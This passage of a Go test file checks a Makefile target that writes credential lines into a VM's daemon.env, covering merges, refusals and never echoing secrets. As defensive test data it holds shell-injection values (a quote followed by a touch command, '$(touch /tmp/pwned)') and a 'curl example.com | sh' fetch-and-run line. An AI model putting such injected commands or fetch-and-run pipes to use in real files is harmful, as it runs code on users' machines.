			}

			if tc.removedName == "" {
				// A file with no such line: the drop was nothing, so a warning would teach a maintainer to ignore it.
				if strings.Contains(strings.ToLower(text), "revoke") {
					t.Errorf("make vm-env's output talks about revoking a token although the VM's daemon.env held no GitHub token line: the note must appear only when a line was really removed, or a maintainer learns to ignore it (PRD #161 milestone 3)\nstdout: %s\nstderr: %s",
						stdout, stderr)
				}
			} else {
				if !strings.Contains(text, tc.removedName) {
					t.Errorf("make vm-env removed the stale %s line from the VM's daemon.env without telling the maintainer: that line sat where the login shell of every agent the VM starts read it, so the drop must name the variable (PRD #161 milestone 3)\nstdout: %s\nstderr: %s",
						tc.removedName, stdout, stderr)
				}

				if !strings.Contains(strings.ToLower(text), "revoke") {
					t.Errorf("make vm-env removed the stale %s line from the VM's daemon.env without saying to revoke that token: every agent in the VM could read it, so removing the line is not enough - the maintainer must revoke it at GitHub (PRD #161 milestone 3)\nstdout: %s\nstderr: %s",
						tc.removedName, stdout, stderr)
				}

				assertNoSecrets(t, "make vm-env's output", text, []secret{
					{kind: "the stale " + tc.removedName + " line's value", value: tc.removedValue},
				})
			}

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvNarrowedVMEnvKeepsTheOtherCredentials pins the decision recorded on issue #234: making vm-env
// write only a few names by narrowing VM_ENV merges - it replaces the names it lists and keeps every other line
// already in the file - so `make vm-env VM_ENV=DEEPSEEK_API_KEY` never drops the OAuth token. A narrowed name
// that is missing is refused like any other, and the file stays as it was.
func TestMakeVMEnvNarrowedVMEnvKeepsTheOtherCredentials(t *testing.T) {
	t.Parallel()

	// One of the two names VM_ENV still lists (PRD #161 milestone 3): GITHUB_TOKEN is no credential of the VM
	// any more, so narrowing to it would pin a name the switch-over removed.
	const narrowed = "DEEPSEEK_API_KEY"

	t.Run("the name it lists is replaced and the others are kept", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		delete(env, "CLAUDE_CODE_OAUTH_TOKEN")

		sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + narrowed}, env)
		if err != nil {
			t.Fatalf("make vm-env VM_ENV=%s with %s set: %v\nstdout: %s\nstderr: %s", narrowed, narrowed, err, stdout, stderr)
		}

		body, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env: %v", readErr)
		}

		want := []string{
			"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
			"DEEPSEEK_API_KEY=" + fakeEnvValue(narrowed),
		}

		if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
			t.Errorf("make vm-env VM_ENV=%s wrote the wrong lines to the VM's daemon.env: it must replace %s and keep every other line already in the file (issue #234) (-want +got):\n%s", narrowed, narrowed, diff)
		}

		// A merge says, by name, which lines it left in place (the auditor's finding on issue #234): the
		// maintainer who narrows VM_ENV to one credential must see from the run itself what stays in
		// daemon.env, without opening the file and without any value being printed.
		keptNames := slices.DeleteFunc(slices.Clone(vmEnvCredentials), func(name string) bool {
			return name == narrowed
		})

		for _, name := range keptNames {
			if !strings.Contains(stdout+stderr, name) {
				t.Errorf("make vm-env VM_ENV=%s kept the line daemon.env already held for %s but never names it: a merge must print the names - only the names - of the lines it kept, so a maintainer sees what stays in the file (issue #234)\nstdout: %s\nstderr: %s",
					narrowed, name, stdout, stderr)
			}
		}

		// Names only, never values: neither the ones the file held before the run nor the ones it copied in.
		assertNoSecrets(t, "make vm-env VM_ENV="+narrowed+"'s output", stdout+stderr, []secret{
			{kind: "earlier value of CLAUDE_CODE_OAUTH_TOKEN", value: "old-oauth"},
			{kind: "earlier value of DEEPSEEK_API_KEY", value: "old-deepseek"},
		})

		assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
	})

	t.Run("a name listed twice is written once", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		delete(env, "CLAUDE_CODE_OAUTH_TOKEN")

		sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + narrowed + "," + narrowed}, env)
		if err != nil {
			t.Fatalf("make vm-env VM_ENV=%s,%s with %s set: %v\nstdout: %s\nstderr: %s", narrowed, narrowed, narrowed, err, stdout, stderr)
		}

		body, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env: %v", readErr)
		}

		want := narrowed + "=" + fakeEnvValue(narrowed)

		written := 0

		for _, line := range sortedEnvLines(string(body)) {
			if strings.HasPrefix(line, narrowed+"=") {
				written++
			}
		}

		if written != 1 {
			t.Errorf("make vm-env VM_ENV=%s,%s wrote %d %s lines, want exactly 1: a name listed twice reaches daemon.env once, so the file stays one line per credential (issue #234). The lines it wrote: %v",
				narrowed, narrowed, written, narrowed, sortedEnvLines(string(body)))
		}

		if !slices.Contains(sortedEnvLines(string(body)), want) {
			t.Errorf("make vm-env VM_ENV=%s,%s did not write the value it was given to daemon.env: the lines it wrote are %v, want one of them the %s line with the value the shell held (issue #234)",
				narrowed, narrowed, sortedEnvLines(string(body)), narrowed)
		}

		assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
	})

	t.Run("the name it lists is missing, so it is refused and the file is kept", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		for _, name := range vmEnvCredentials {
			delete(env, name)
		}

		seeded := sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + narrowed}, env)
		if err == nil {
			t.Fatalf("make vm-env VM_ENV=%s exited 0 with %s missing: a narrowed VM_ENV must be refused like any other, so the VM keeps the credentials it has (issue #234)\nstdout: %s\nstderr: %s", narrowed, narrowed, stdout, stderr)
		}

		if !strings.Contains(stdout+stderr, narrowed) {
			t.Errorf("the refusal does not name %s, the one name VM_ENV lists:\nstdout: %s\nstderr: %s", narrowed, stdout, stderr)
		}

		got, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
		}

		if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
			t.Errorf("make vm-env rewrote the VM's daemon.env although it refused: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
		}

		// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
		// nothing is handed limactl.
		sb.assertNoLimaCalls(t, "a missing narrowed name is refused")
	})
}

// TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt pins the second-round audit finding on issue #234: the names
// in VM_ENV reach the recipe inside shell quoting, so a value that closes the quote runs whatever follows it on
// the host - a name holding a single quote and a command behind it would touch a file before vm-env had checked
// anything. vm-env must refuse such a VM_ENV before a shell expands it, whether it is on the command line or in
// the environment: non-zero, nothing run on the host, nothing handed limactl, and the VM's daemon.env byte for
// byte as it was.
func TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		inEnv bool // VM_ENV exported in make's environment instead of given on the command line
	}{
		{name: "on the command line"},
		{name: "in the environment", inEnv: true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()
			seeded := sb.seedDaemonEnv(t)

			// The value a maintainer's .envrc or a mistyped command line could hold: a valid name, a quote
			// that ends the quoted word, and a command that runs if the quote is not refused.
			pwned := filepath.Join(t.TempDir(), "pwned")
			vmEnv := "INVENTED_TOKEN';touch " + pwned + ";'"

			args := []string{"vm-env"}

			if tc.inEnv {
				env = withVMEnvInEnv(env, vmEnv)
			} else {
				args = append(args, "VM_ENV="+vmEnv)
			}

			stdout, stderr, err := runMake(t, args, env)
			text := stdout + stderr

			if err == nil {
				t.Errorf("make vm-env exited 0 with a VM_ENV holding a single quote: it must refuse a value the shell would split into several words before it expands it, so nothing behind the quote is ever run (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			if !strings.Contains(text, "VM_ENV") {
				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			// The command behind the quote never ran on the host.
			if _, statErr := os.Stat(pwned); !errors.Is(statErr, fs.ErrNotExist) {
				t.Errorf("make vm-env ran the command behind the single quote in VM_ENV: %s exists, so the quote closed the word the recipe built and the shell ran what followed it. A VM_ENV the shell cannot read as one word must be refused before any shell sees it (issue #234, stat error: %v)",
					pwned, statErr)
			}

			sb.assertNoLimaCalls(t, "a VM_ENV holding a single quote is refused")

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although there was no VM_ENV it could read: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvRefusalNeverEchoesTheVMEnv pins the final-round audit finding on issue #234 (L1, review 1): a
// VM_ENV the shell would not read as one word is refused, and the refusal must not print it. A VM_ENV can hold
// a credential by mistake - a pasted token, or a NAME=value line a maintainer meant as a shell assignment - so
// echoing it writes that value into a terminal's scrollback, a CI log or a screenshot, which is exactly the
// leak every other rule around vm-env avoids. The refusal names VM_ENV and neither echoes the value nor the
// part after its first invalid character. It is made before the VM is touched at all: no limactl call, and the
// VM's daemon.env keeps its bytes.
func TestMakeVMEnvRefusalNeverEchoesTheVMEnv(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		value string // the invented VM_ENV handed to make; no variable of the test machine holds it
		inEnv bool   // VM_ENV exported in make's environment instead of given on the command line
	}{
		{
			// A value a mistyped command line could hold: a dash ends the name and the rest is a value.
			name:  "a value holding a dash, on the command line",
			value: inventedVMEnvValue("oauth-value-with-dash"),
		},
		{
			// The shape an exported assignment has: NAME=<the value>.
			name:  "an exported assignment in the environment",
			value: "INVENTED_TOKEN=" + inventedVMEnvValue("ghp-value"),
			inEnv: true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()
			seeded := sb.seedDaemonEnv(t)

			args := []string{"vm-env"}

			if tc.inEnv {
				env = withVMEnvInEnv(env, tc.value)
			} else {
				args = append(args, "VM_ENV="+tc.value)
			}

			stdout, stderr, err := runMake(t, args, env)
			text := stdout + stderr

			if err == nil {
				t.Fatalf("make vm-env exited 0 with a VM_ENV the shell would not read as one word: it must refuse it (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			if !strings.Contains(text, "VM_ENV") {
				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			// Neither the value nor its tail is echoed. The failure names what was echoed, never the text: the
			// very thing that must not reach the output must not reach a test report either (CLAUDE.md rule 3).
			for _, echo := range []struct {
				kind  string
				value string
			}{
				{kind: "the VM_ENV it was given", value: tc.value},
				{kind: "the part of VM_ENV after its first invalid character", value: vmEnvInvalidTail(tc.value)},
			} {
				if echo.value != "" && strings.Contains(text, echo.value) {
					t.Errorf("the refusal echoes %s: a VM_ENV a shell refused can hold a credential a maintainer pasted by mistake, so echoing it writes that value into a scrollback, a log or a screenshot. The refusal must name VM_ENV and never its content (issue #234 audit L1):\nstdout: %s\nstderr: %s",
						echo.kind, stdout, stderr)
				}
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a VM_ENV the shell cannot read as one word is refused")

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused a VM_ENV the shell would not read as one word: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			assertNoCredentialValues(t, "make vm-env's refusal", text)
		})
	}
}

// TestMakeVMEnvRefusesAnUnreadableDaemonEnvWhenReplacing pins the auditor's finding on PRD #161 milestone 3: a
// replace writes the VM's whole daemon.env, so it must read the file first to name the GitHub token line it
// removes from it. A file that exists but cannot be read - its mode names no read bit for the VM's user - tells
// nothing about the token it may hold, so a replace must refuse in its own words rather than rewrite the file
// unchecked, which would drop such a line without anyone being told to revoke it. The refusal names the file
// and leaves it byte for byte as it was. A merge's refusal of the same file, read to know which lines it keeps,
// is pinned by TestMakeVMEnvRefusesAnUnreadableDaemonEnv.
func TestMakeVMEnvRefusesAnUnreadableDaemonEnvWhenReplacing(t *testing.T) {
	t.Parallel()

	if os.Geteuid() == 0 {
		t.Skip("root reads a mode 000 file, so it cannot stand in for a daemon.env its VM's user cannot read")
	}

	sb := newSandbox(t)
	env := sb.vmEnvEnv()

	// The file an earlier setup left: the two credentials and the maintainer's token line, the one a replace
	// must report having removed - and so must not pass over unread.
	seeded := sb.seedDaemonEnvWith(t, "GITHUB_TOKEN="+fakeEnvValue("GITHUB_TOKEN"))
	path := sb.daemonEnvPath()

	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatalf("make the VM's daemon.env unreadable: %v", err)
	}

	// The default VM_ENV: it replaces the whole file, so the token line leaves the VM with no merge to keep it.
	stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env exited 0 although the VM's daemon.env could not be read: a replace must refuse, or it rewrites a file it never read and a GitHub token line in it is dropped unannounced (PRD #161 milestone 3)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// vm-env's own lines, not make's diagnostics: make closes a failed recipe with the Makefile's own path.
	var said []string

	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
			said = append(said, line)
		}
	}

	saidText := strings.Join(said, "\n")
	lower := strings.ToLower(saidText)

	if !strings.Contains(saidText, "daemon.env") {
		t.Errorf("make vm-env's output holds no vm-env line naming daemon.env, so the run failed without refusing: a maintainer whose daemon.env the VM's user cannot read needs vm-env to name the file it could not read and say that nothing was written, not a shell's error about a missing file (PRD #161 milestone 3):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// What the read was for: the refusal says it could not check the file for a GitHub token, so a maintainer
	// knows why a replace - which would rewrite the file in any case - stops on it.
	if !slices.ContainsFunc([]string{"cannot", "can not", "unable"}, func(word string) bool {
		return strings.Contains(lower, word)
	}) {
		t.Errorf("the refusal does not say that it cannot read or check daemon.env, so a maintainer reads a non-zero exit as a broken target instead of a file to fix (PRD #161 milestone 3):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if !strings.Contains(lower, "github") || !strings.Contains(lower, "token") {
		t.Errorf("the refusal does not say that what it could not check daemon.env for is a GitHub token, so a maintainer cannot tell why an unreadable file stops a replace that rewrites it anyway (PRD #161 milestone 3):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The mode back, so the bytes can be compared at all: the test reads the file it just made unreadable.
	if chmodErr := os.Chmod(path, 0o600); chmodErr != nil {
		t.Fatalf("restore the mode of the VM's daemon.env so the test can read it back: %v", chmodErr)
	}

	got, readErr := os.ReadFile(path)
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env it could not read, dropping the GitHub token line unchecked: a replace must refuse such a file and leave it byte for byte as it was (PRD #161 milestone 3) (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", text)
}

// TestMakeVMEnvRefusesAnUnreadableDaemonEnv pins the final-round audit finding on issue #234 (L2): a merge
// reads the VM's daemon.env to decide which lines it keeps. When that read fails - the file's mode names no
// read bit for the VM's user - vm-env must refuse, deliberately and in its own words, rather than treat
// "cannot read" as "nothing to keep" and replace the file, which would silently drop every line the merge
// could not read. The refusal names the file a maintainer has to fix and leaves it byte for byte as it was, so
// the maintainer can chmod it and run the merge again.
func TestMakeVMEnvRefusesAnUnreadableDaemonEnv(t *testing.T) {
	t.Parallel()

	if os.Geteuid() == 0 {
		t.Skip("root reads a mode 000 file, so it cannot stand in for a daemon.env its VM's user cannot read")
	}

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	delete(env, "CLAUDE_CODE_OAUTH_TOKEN")

	seeded := sb.seedDaemonEnv(t)
	path := sb.daemonEnvPath()

	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatalf("make the VM's daemon.env unreadable: %v", err)
	}

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=DEEPSEEK_API_KEY"}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV=DEEPSEEK_API_KEY exited 0 although the VM's daemon.env could not be read: a merge must refuse, so no line it could not read is silently replaced (issue #234 audit L2)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The refusal is vm-env's own, and names the file the maintainer has to fix: today's run dies with the
	// VM-side shell's arithmetic error, which says nothing about daemon.env and is no refusal at all.
	var said []string

	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
			said = append(said, line)
		}
	}

	if !strings.Contains(strings.Join(said, "\n"), "daemon.env") {
		t.Errorf("make vm-env's output holds no vm-env line naming daemon.env, so the run failed without refusing: a maintainer whose daemon.env the VM's user cannot read needs vm-env to say which file it could not read and that nothing was written, not a shell's error about an arithmetic expression (issue #234 audit L2):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The mode back, so the bytes can be compared at all: the test reads the file it just made unreadable.
	if chmodErr := os.Chmod(path, 0o600); chmodErr != nil {
		t.Fatalf("restore the mode of the VM's daemon.env so the test can read it back: %v", chmodErr)
	}

	got, readErr := os.ReadFile(path)
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env whose lines it could not read, silently dropping them: an unreadable file must be refused and left byte for byte as it was (issue #234 audit L2) (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}

// TestMakeVMEnvSweepsOnlyOldLeftovers pins the final-round review finding and audit finding on issue #234
// (review 2, audit L3): the temporary files a killed vm-env leaves beside daemon.env are swept, but only the
// ones older than a minute. A temporary file written right now is a concurrent vm-env's: removing it makes
// that run's final move fail or, worse, move a file the other run still writes, so the sweep leaves a fresh
// one alone. A name the sweep does not match is never its business.
//
// Issue #259's second item narrowed the sweep further: it removes regular files only. A directory named like a
// leftover - mktemp never writes one, so a maintainer or another tool made it - is left where it is, and the run
// still succeeds: `rm -f` refuses a directory, and a sweep that stops there fails the whole vm-env.
func TestMakeVMEnvSweepsOnlyOldLeftovers(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	dir := sb.vmPath(".config/dot-agent-deck")

	// The leftovers as mktemp names them: one from a run killed ten minutes ago, one a run that is writing it
	// right now, one name the sweep's pattern does not match, and a directory an older sweep matched by name.
	stale := filepath.Join(dir, ".daemon.env.abc123")
	concurrent := filepath.Join(dir, ".daemon.env.def456")
	unmatched := filepath.Join(dir, ".daemon.env.bak")
	staleDir := filepath.Join(dir, ".daemon.env.ghi789")

	for _, path := range []string{stale, concurrent, unmatched} {
		writeFileMode(t, path, []byte("LEFT_OVER=\n"), 0o600)
	}

	if err := os.Mkdir(staleDir, 0o700); err != nil {
		t.Fatalf("make a directory named like a leftover: %v", err)
	}

	tenMinutesAgo := time.Now().Add(-10 * time.Minute)

	for _, path := range []string{stale, unmatched, staleDir} {
		if err := os.Chtimes(path, tenMinutesAgo, tenMinutesAgo); err != nil {
			t.Fatalf("age the leftover %s: %v", filepath.Base(path), err)
		}
	}

	stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
	if err != nil {
		t.Fatalf("make vm-env with every credential set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	if _, statErr := os.Stat(stale); !errors.Is(statErr, fs.ErrNotExist) {
		t.Errorf("make vm-env left %s, the temporary file of a run killed ten minutes ago: the sweep must remove a leftover older than a minute, or every interrupted run leaves a file next to daemon.env for good (issue #234) (stat error: %v)",
			filepath.Base(stale), statErr)
	}

	if _, statErr := os.Stat(concurrent); statErr != nil {
		t.Errorf("make vm-env removed %s, the temporary file of a vm-env that is still running: the sweep must leave a fresh temporary file alone, so a concurrent run's file is not removed under it (issue #234 review 2, audit L3): %v",
			filepath.Base(concurrent), statErr)
	}

	if _, statErr := os.Stat(unmatched); statErr != nil {
		t.Errorf("make vm-env removed %s, whose name the sweep's pattern does not match: the sweep removes only the temporary files mktemp writes beside daemon.env, never another file of that directory (issue #234): %v",
			filepath.Base(unmatched), statErr)
	}

	// A directory the sweep's name and age match is no leftover of mktemp's: the sweep removes regular files
	// only, so it stays where it is and the run above still succeeded (issue #259).
	if info, statErr := os.Stat(staleDir); statErr != nil {
		t.Errorf("make vm-env removed %s, a directory named like a leftover and older than a minute: mktemp writes files, so the sweep removes regular files only and leaves a directory alone (issue #259): %v",
			filepath.Base(staleDir), statErr)
	} else if !info.IsDir() {
		t.Errorf("make vm-env replaced the directory %s with a regular file: the sweep removes leftovers and nothing else (issue #259)", filepath.Base(staleDir))
	}

	body, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env: %v", readErr)
	}

	want := []string{
		"CLAUDE_CODE_OAUTH_TOKEN=" + fakeEnvValue("CLAUDE_CODE_OAUTH_TOKEN"),
		"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
	}

	if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
		t.Errorf("make vm-env wrote the wrong lines to the VM's daemon.env (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
}

// TestMakeVMEnvRefusesAGlobAsAName pins the reviewer's finding on issue #234: `make vm-env VM_ENV=*` names no
// variable, and make must refuse it. The star is not a variable name, and the shell must never expand it in the
// working directory first: the refusal would then list the names of the files there, none of which the
// maintainer asked for. The refusal itself names VM_ENV and shows none of its value, the star included: `*`
// may stand where a credential was meant, and a value must never reach a pane (issue #234 audit L1).
func TestMakeVMEnvRefusesAGlobAsAName(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	seeded := sb.seedDaemonEnv(t)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=*"}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV=* exited 0: a star is not a variable name, so it must be refused (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// vm-env's own lines, not make's diagnostics: make closes a failed recipe with the Makefile's own path.
	var said []string

	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
			said = append(said, line)
		}
	}

	// vm-env's own lines, without make's `***`, which is why the star is looked for here and not in all of text.
	saidText := strings.Join(said, "\n")

	if !strings.Contains(saidText, "VM_ENV") {
		t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if !strings.Contains(strings.ToLower(saidText), "not shown") {
		t.Errorf("the refusal does not say that VM_ENV's value is not shown, so a maintainer cannot tell whether the star they handed vm-env was echoed (issue #234 audit L1):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if strings.Contains(saidText, "*") {
		t.Errorf("the refusal shows the star it was given: the character-class refusal must show none of VM_ENV's value, because a maintainer may have pasted a credential where the star stands (issue #234 audit L1):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// A file of the working directory standing in for the name: the star was globbed, not refused.
	root, absErr := filepath.Abs(moduleRoot)
	if absErr != nil {
		t.Fatalf("resolve the repository root: %v", absErr)
	}

	entries, readDirErr := os.ReadDir(root)
	if readDirErr != nil {
		t.Fatalf("read %s: %v", root, readDirErr)
	}

	for _, entry := range entries {
		// The shell's `*` never matches a name that starts with a dot.
		if strings.HasPrefix(entry.Name(), ".") {
			continue
		}

		if strings.Contains(saidText, entry.Name()) {
			t.Errorf("the refusal names %q, an entry of the working directory: VM_ENV's `*` was expanded by the shell instead of being refused as the name it is (issue #234):\nstdout: %s\nstderr: %s",
				entry.Name(), stdout, stderr)
		}
	}

	sb.assertNoLimaCalls(t, "a star is not a variable name")

	got, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env although VM_ENV named no variable: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
	}
}

// shellUnsafeAssignment is a daemon.env line that is an assignment only to the eye: its value runs a command
// when the login shell sources the file, which is why a merge must not carry it over (issue #234). Its name is
// invented, so no real variable of the test machine is named so.
const shellUnsafeAssignment = "INVENTED_SETTING=$(touch /tmp/pwned)"

// TestMakeVMEnvMergeKeepsOnlySafeLines pins the second-round audit's other finding on issue #234: a merge copies
// the lines it does not name out of the VM's daemon.env, and that file is shell source. A command, a comment or
// an assignment whose value is a command substitution must not travel into the new file, which the login shell
// sources at every start. vm-env keeps only plain NAME=value lines, warns that it dropped the others, and never
// prints what it dropped: the content of a line it refused is exactly what a maintainer must not see in a log
// or a terminal scrollback.
func TestMakeVMEnvMergeKeepsOnlySafeLines(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()

	// A daemon.env a maintainer or an earlier setup left: one line to keep, and four that are shell code
	// rather than an assignment - a command, a comment, an assignment whose value runs a command, and one
	// whose name VM_ENV does list. The merge drops that last one too, and counts it: the line is replaced by
	// the value vm-env writes, but it is dropped as well, so a maintainer reading the count learns that
	// nothing of the earlier file's line survived (issue #234 review nit 3).
	unsafeLines := []string{
		"curl example.com | sh",
		"# note",
		shellUnsafeAssignment,
		"DEEPSEEK_API_KEY=$(touch /tmp/never)",
	}
	body := "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\n" + strings.Join(unsafeLines, "\n") + "\nINVENTED_SETTING=old-value\n"

	writeFileMode(t, sb.daemonEnvPath(), []byte(body), 0o600)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=DEEPSEEK_API_KEY"}, env)
	if err != nil {
		t.Fatalf("make vm-env VM_ENV=DEEPSEEK_API_KEY with DEEPSEEK_API_KEY set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	written, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env: %v", readErr)
	}

	want := []string{
		"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
		"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
		"INVENTED_SETTING=old-value",
	}

	if diff := cmp.Diff(want, sortedEnvLines(string(written))); diff != "" {
		t.Errorf("make vm-env VM_ENV=DEEPSEEK_API_KEY wrote the wrong lines to the VM's daemon.env: a merge keeps only the plain NAME=value lines it does not name and drops every other line, so no shell code of an earlier daemon.env reaches the file the login shell sources (issue #234) (-want +got):\n%s", diff)
	}

	// The rule the kept lines follow, stated as the merge must apply it: a plain name, an `=`, and a value of
	// the characters an environment value may have.
	safe := regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=[A-Za-z0-9._~+/=-]*$`)

	for _, line := range sortedEnvLines(string(written)) {
		if !safe.MatchString(line) {
			t.Errorf("make vm-env kept %q in the VM's daemon.env: every line must match %s, or the login shell runs what the line holds at the next start (issue #234)",
				line, safe)
		}
	}

	// The merge says that it dropped lines, without saying what they held.
	lower := strings.ToLower(stdout + stderr)

	dropped := []string{"drop", "skip", "ignor"}
	if !slices.ContainsFunc(dropped, func(word string) bool { return strings.Contains(lower, word) }) {
		t.Errorf("make vm-env VM_ENV=DEEPSEEK_API_KEY dropped %d line(s) of the earlier daemon.env without saying so: a merge that silently discards a setting leaves the maintainer with no way to learn that daemon.env lost it, and no clue which (issue #234)\nstdout: %s\nstderr: %s",
			len(unsafeLines), stdout, stderr)
	}

	// The warning's count is exact, not "some lines": a maintainer reads it to know how much of daemon.env the
	// merge left behind, and a line VM_ENV names is dropped like every other unsafe line (issue #234 review
	// nit 3).
	droppedWarning := regexp.MustCompile(`(?i)dropped\s+(\d+)\s+line`)

	if match := droppedWarning.FindStringSubmatch(stdout + stderr); match == nil {
		t.Errorf("make vm-env's warning does not say how many lines it dropped, so the maintainer cannot tell whether a line of daemon.env was lost (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	} else if match[1] != strconv.Itoa(len(unsafeLines)) {
		t.Errorf("make vm-env's warning says it dropped %s line(s), want %d: the count is every line of the earlier daemon.env that is not a plain NAME=value line, including one whose name VM_ENV lists (issue #234 review nit 3):\nstdout: %s\nstderr: %s",
			match[1], len(unsafeLines), stdout, stderr)
	}

	for _, line := range unsafeLines {
		if strings.Contains(stdout+stderr, line) {
